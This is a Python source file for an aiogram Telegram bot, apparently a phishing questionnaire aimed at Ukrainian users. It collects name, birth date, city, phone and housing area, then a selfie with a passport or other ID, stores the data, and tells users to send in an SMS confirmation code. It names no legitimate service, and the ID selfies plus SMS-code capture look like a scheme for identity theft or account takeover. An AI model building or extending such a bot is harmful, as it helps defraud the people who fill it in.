from aiogram import Router, types, F
from aiogram.fsm.context import FSMContext
from states.form_states import Form
from keyboard.inline import next_keyboard, confirm_keyboard
from database.db import save_user_data

router = Router()

# --- Этап 1. Нажата кнопка "Продолжить" после /start
@router.callback_query(F.data == "continue_form")
async def send_form_intro(callback: types.CallbackQuery):
    await callback.message.edit_caption(
        caption="Для початку заповніть невелику анкету про себе.",
        reply_markup=next_keyboard()
    )

# --- Этап 2. Начало анкеты
@router.callback_query(F.data == "next_question")
async def ask_full_name(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.full_name)
    await callback.message.answer("Вкажіть ПІБ:\n"
    "Зразок: Борисенко Сергій Валерійович")

# --- Этап 3. Вопросы анкеты ---
@router.message(Form.full_name)
async def process_full_name(message: types.Message, state: FSMContext):
    await state.update_data(full_name=message.text)
    await state.set_state(Form.age)
    await message.answer("Вкажіть дату народження (ДД.ММ.РРРР):\n"
    "Зразок: 10.05.1990")

@router.message(Form.age)
async def process_age(message: types.Message, state: FSMContext):
    await state.update_data(age=message.text)
    await state.set_state(Form.city)
    await message.answer("Вкажіть місто проживання:\n"
    "Зразок: Київ")

@router.message(Form.city)
async def process_city(message: types.Message, state: FSMContext):
    await state.update_data(city=message.text)
    await state.set_state(Form.phone)
    await message.answer("Вкажіть мобільний номер телефону:\n"
    "Зразок: +380501105011")

@router.message(Form.phone)
async def process_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await state.set_state(Form.email)
    await message.answer("Вкажіть приблизну площу вашого житла (приміщення):\n"
    "Зразок: 45 м²")

@router.message(Form.email)
async def process_email(message: types.Message, state: FSMContext):
    await state.update_data(email=message.text)
    await state.set_state(Form.document_photo)
    await message.answer("Для підтвердження особи, необхідно надати селфі зі своїм документом:\n"
    "Підійде будь-який з таких документів:\n"
    "1. Паспорт громадянина України (ID-картка або книжка);\n"
    "2. Закордонний паспорт;\n"
    "3. Водійські права;\n"
    "4. Посвідчення особи військовослужбовця.\n")

# --- Этап 4. Получение фото ---
@router.message(Form.document_photo, F.photo)
async def process_document_photo(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    photo_id = message.photo[-1].file_id

    data = await state.get_data()
    data["document_photo"] = photo_id
    save_user_data(user_id, data)

    await state.clear()

    await message.answer(
        "Дякуємо за заповнену анкету!\n" \
        "Протягом 24 годин на ваш мобільний телефон надійде SMS-повідомлення з кодом підтвердження анкети.\n" \
        "\n" \
        "Що робити далі:\n" \
        "1. Отримайте код з SMS\n" \
        "2. Поверніться в цей чат-бот\n" \
        "3. Введіть отриманий код у відповідь на це повідомлення\n" \
        "\n" \
        "--Увага! Не надсилайте код нікому в приватних повідомленнях. Ми його запитуватимемо лише в офіційному боті.\n" \
        "--Якщо SMS не надійшло, перевірте правильність номера телефону в анкеті або зверніться до нашої служби підтримки.\n",
        reply_markup=confirm_keyboard()
    )

# --- Этап 5. Подтверждение ---
@router.callback_query(F.data == "confirm_sms")
async def confirm_sms(callback: types.CallbackQuery):
    await callback.message.answer("📩 (Здесь будет логика отправки СМС...)")
